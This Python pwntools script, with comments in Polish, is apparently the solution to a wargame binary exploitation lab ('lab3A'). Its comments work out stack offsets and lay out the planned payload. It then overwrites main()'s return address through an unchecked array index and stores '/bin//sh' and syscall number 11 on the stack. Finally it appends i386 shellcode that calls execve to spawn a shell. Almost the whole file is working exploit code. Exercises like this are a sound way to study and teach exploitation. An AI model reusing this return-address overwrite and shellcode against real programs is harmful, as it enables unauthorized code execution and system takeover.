# -*- coding: utf-8 -*-
from pwn import *

context(arch ='i386', os ='linux')

# Początek bufora: 0xBFFFF3F8
# RA main(): 0xBFFFF5AC ==> Index (0xBFFFF5AC - 0xBFFFF3F8)/ 4 = 109 (index). Niestety jest check na integer overflow i trzeba to robić w ten sposób.
# Bufor: adres do wpisania = numer + (index * 4)
#
# EAX - ptr to 0xB
# EBX - ptr to /bin//sh
# ECX - ptr to /bin//sh,0x0
# EDX - ptr to 0x0
#
# ======= Stack with payload =======
# 0x0 [index 109] [Overwritten RA]
# 0x4 [index 110] /bin
# 0x8 [index 111] reserved for quend!
# 0xC [index 112] //sh
# 0x10 [index 113] 0xB

# Script usage: python lab3a.py | ./lab3A

def string_to_int(string):
    return str(int((string)[::-1].encode('hex'), 16))

sh = [
    "pop esi",  # 110 0x68732f2f
    "pop ecx",  # 111 reserved for quend!
    "pop ecx",  # 112 0x6e69622f"
    "pop eax",  # 113 syscall number

    "push esi",
    "push ecx",

    "mov  ebx, esp",

    "mov ecx, edi",
    "mov edx, edi",
    "int  0x80",
]

shellcode = ''

for instr in sh:
    shellcode += asm(instr)

# ----
print 'store'
print str(int(0xBFFFF58C)) #[Overwritten RA]
print '109'
# ----
print 'store'
print string_to_int('/sh')
print '110'
# ----
print 'store'
print string_to_int('/bin')
# Indeks 111 jest zarezerwowany i nie można z niego skorzystać
print '112'
# ----
print 'store'
print '11'
print '113'
# ----
print 'quit' + shellcode

